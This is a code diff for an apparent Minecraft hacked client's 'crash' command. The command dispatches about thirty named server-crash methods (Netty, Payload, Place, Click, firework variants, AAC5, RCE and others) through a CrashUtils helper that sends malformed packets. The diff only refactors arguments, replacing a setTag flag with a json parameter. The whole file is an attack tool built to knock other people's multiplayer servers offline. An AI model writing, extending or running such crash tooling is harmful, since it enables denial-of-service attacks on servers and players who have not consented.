@@ -10,11 +10,6 @@ import cn.loli.client.utils.CrashUtils;
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.Packet;
 import net.minecraft.network.play.client.C01PacketChatMessage;
-import net.minecraft.network.play.client.C12PacketUpdateSign;
-import net.minecraft.util.BlockPos;
-import net.minecraft.util.ChatComponentText;
-import net.minecraft.util.ChatComponentTranslation;
-import net.minecraft.util.IChatComponent;
 import org.jetbrains.annotations.NotNull;
 
 import java.util.ArrayList;
@@ -24,13 +19,12 @@ import java.util.Random;
 
 public class CrashCommand extends Command {
 
-    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "PayLoad", "Netty",
+    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "Payload", "Netty",
             "Place", "Click", "Create", "Cap", "Place2", "Place3", "Click2", "Click3", "NettyP", "NettyPL", "NettyC", "AAC5",
             "FWP", "FWC", "FWCreate", "FWP2", "FWP3", "FWC2", "FWC3", "Action", "Action2", "RCE"};
     CrashUtils crashUtils = new CrashUtils();
 
-    int bookType, bookvalue, redo, resolvebyte;
-    boolean setTag;
+    int bookType, bookvalue, redo, resolvebyte, json;
 
     public CrashCommand() {
         super("crash", "c", "crash");
@@ -39,7 +33,7 @@ public class CrashCommand extends Command {
     @Override
     public void run(String alias, @NotNull String[] args) {
         if (args.length < 1) {
-            NotificationManager.show(new Notification(NotificationType.INFO, "Crasher", "Usage: ." + alias + " method_name/list <amount> delay(ms) (type [0 , 1]) (value [size]) (redo [type]) (byte [1]) (tags [0 true])", 5));
+            NotificationManager.show(new Notification(NotificationType.INFO, "Crasher", "Usage: ." + alias + " method_name/list amount delay(ms) type(0,1) value redo resolveByte bypass(0,1)", 5));
             return;
         }
 
@@ -64,23 +58,23 @@ public class CrashCommand extends Command {
                     redo = Integer.parseInt(args[5]);
                     if (args.length > 7) {
                         resolvebyte = Integer.parseInt(args[6]);
-                        setTag = Integer.parseInt(args[7]) == 0;
+                        json = Integer.parseInt(args[7]);
                     } else {
                         resolvebyte = 1;
-                        setTag = false;
+                        json = 0;
                     }
                 } else {
                     bookType = 0;
                     bookvalue = 800;
                     redo = 5;
                     resolvebyte = 1;
-                    setTag = false;
+                    json = 0;
                 }
 
 
                 Main.INSTANCE.packetQueue.clear();
 
-                ChatUtils.info(bookType + " " + bookvalue + " " + redo + " " + resolvebyte + " " + setTag + " ");
+                ChatUtils.info(bookType + " " + bookvalue + " " + redo + " " + resolvebyte + " " + json + " ");
 
                 switch (CrashType.toLowerCase()) {
                     case "pex": //Pex (outdated)
@@ -97,46 +91,46 @@ public class CrashCommand extends Command {
                         crashUtils.custombyte(value);
                         break;
                     case "payload":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, 833, 1, false, CrashUtils.CrashType.PAYLOAD1, amounts, false, 1);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, 833, 1, json, CrashUtils.CrashType.PAYLOAD1, amounts, 1);
                         break;
                     case "payload2":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.PAYLOAD2, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PAYLOAD2, amounts, resolvebyte);
                         break;
                     case "place":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.PLACE, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE, amounts, resolvebyte);
                         break;
                     case "click":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CLICK, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK, amounts, resolvebyte);
                         break;
                     case "create":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CREATE, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CREATE, amounts, resolvebyte);
                         break;
                     case "cap":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CAP, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CAP, amounts, resolvebyte);
                         break;
                     case "netty":
-                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, true, CrashUtils.CrashType.CLICK, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.CLICK, amounts, resolvebyte);
                         break;
                     case "nettyp":
-                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, true, CrashUtils.CrashType.PLACE3, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.PLACE3, amounts, resolvebyte);
                         break;
                     case "nettypl":
-                        crashUtils.crashdemo("/n", bookType, bookvalue, redo, true, CrashUtils.CrashType.PAYLOAD1, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo("/n", bookType, bookvalue, redo, 2, CrashUtils.CrashType.PAYLOAD1, amounts, resolvebyte);
                         break;
                     case "nettyc":
-                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, true, CrashUtils.CrashType.CREATE, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.CREATE, amounts, resolvebyte);
                         break;
                     case "place2":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.PLACE2, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE2, amounts, resolvebyte);
                         break;
                     case "place3":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.PLACE3, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE3, amounts, resolvebyte);
                         break;
                     case "click2":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CLICK2, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK2, amounts, resolvebyte);
                         break;
                     case "click3":
-                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CLICK3, amounts, setTag, resolvebyte);
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK3, amounts, resolvebyte);
                         break;
                     case "fwc":
                         crashUtils.firework(amounts, CrashUtils.CrashType.CLICK);
